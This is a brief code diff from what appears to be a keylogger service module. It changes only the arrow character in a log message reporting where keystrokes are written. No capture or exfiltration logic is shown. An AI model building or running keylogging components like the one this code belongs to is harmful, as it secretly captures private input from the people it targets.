@@ -14,7 +14,7 @@ def start_keylogger_service(agent_id):
         if listener is None:
             logger.error("Key logger disabled.")
         else:
-            logger.info(f"Key logger running → {KEYLOG_FILE}")
+            logger.info(f"Key logger running -> {KEYLOG_FILE}")
 
     except Exception as e:
         logger.error(f"Key logger error: {e}")
